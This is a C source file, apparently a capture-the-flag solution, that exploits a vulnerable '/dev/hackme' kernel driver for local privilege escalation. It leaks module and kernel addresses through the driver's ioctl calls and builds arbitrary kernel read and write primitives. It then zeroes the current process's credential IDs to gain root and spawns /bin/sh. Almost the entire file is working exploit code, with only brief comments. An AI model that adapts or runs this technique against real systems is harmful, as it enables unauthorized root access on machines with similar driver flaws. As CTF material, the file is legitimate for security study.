// gcc -nostdlib -e main pwn_tiny.c -o pwn_tiny
// flag: *CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}
// cred pointer in task_struct
#define CRED_OFFSET 0x3c0

int dev_fd;
typedef unsigned long long int uint64;
uint64 module_base;
uint64 commit_creds;
uint64 prepare_kernel_cred;
uint64 current_task;
uint64 bias = 0x000800640000000e;

long int syscall64(long int callno, ...) {

	asm("movq %rdi, %rax		/* Syscall number -> rax.  */\n"
		"movq %rsi, %rdi		/* shift arg1 - arg5.  */\n"
		"movq %rdx, %rsi\n"
		"movq %rcx, %rdx\n"
		"movq %r8, %r10\n"
		"movq %r9, %r8\n"
		"movq 8(%rsp),%r9	/* arg6 is on the stack.  */\n"
		"syscall			/* Do the system call.  */\n"
	);
}

long int ioctl(int fd, unsigned int request, unsigned long arg) {
	return syscall64(16, fd, request, arg);
}

long int open(char *filename, int flag) {
	return syscall64(2, filename, flag, 0);
}

long int execve(char *prog, char** argv, char **environ) {
	return syscall64(59, prog, argv, environ);
}

long int write(int fd, char *buf, long int size) {
	return syscall64(1, fd, buf, size);
}

struct Request{
	int index;
	int padding;
	char* buffer;
	long long int size;
	long long int offset;
};

void new(int index, char* buffer, long long int size) {
	struct Request req;
	req.index = index;
	req.buffer = buffer;
	req.size = size;
	if (ioctl(dev_fd, 0x30000, &req) < 0) {
		write(1, "new error\n", 10);
	}
}

void edit(int index, char* buffer, long long int size, long long int offset) {
	struct Request req;
	req.index = index;
	req.buffer = buffer;
	req.size = size;
	req.offset = offset;
	if (ioctl(dev_fd, 0x30002, &req) < 0) {
		write(1, "edit error\n", 11);
	}
}

void get(int index, char* buffer, long long int size, long long int offset) {
	struct Request req;
	req.index = index;
	req.buffer = buffer;
	req.size = size;
	req.offset = offset;
	if (ioctl(dev_fd, 0x30003, &req) < 0) {
		write(1, "get error\n", 10);
	}
}

void arb_read(char *buffer, uint64 addr, uint64 size) {
	get(0xc3, buffer, size, addr - bias);
}

void arb_write(char *buffer, uint64 addr, uint64 size) {
	edit(0xc3, buffer, size, addr - bias);
}

int main() {
	int fd = open("/dev/hackme", 0);
	if (fd < 0) {
		write(1, "open error\n", 11);
		return 1;
	}
	dev_fd = fd;

	// Leak module address via add instruction
	int temp;
	long long int pool;
	get(0xc2, &temp, 0x4, 0x60+2);
	pool = temp;
	module_base = pool - 0x2400;

	// Leak kernel address via call instruction
	get(0xc2, &temp, 0x4, 0x1b+1);
	uint64 copy_from_user = (module_base + 0x1b + 5) + temp;
	commit_creds = copy_from_user - 0xb42e0;
	prepare_kernel_cred = copy_from_user - 0xb4130;
	current_task = copy_from_user + 0x738b40;

	uint64 current;
	uint64 cred;
	char buf[0x30];
	for (int i = 0;i < 0x30; i++) {
		buf[i] = 0;
	}

	arb_read(&current, current_task, 0x8);
	arb_read(&cred, current+CRED_OFFSET, 0x8);
	arb_write(buf, cred+0x4, 0x30);

	char *argv[] = {"/bin/sh", 0};
	execve("/bin/sh", argv, 0);
	return 0;
}
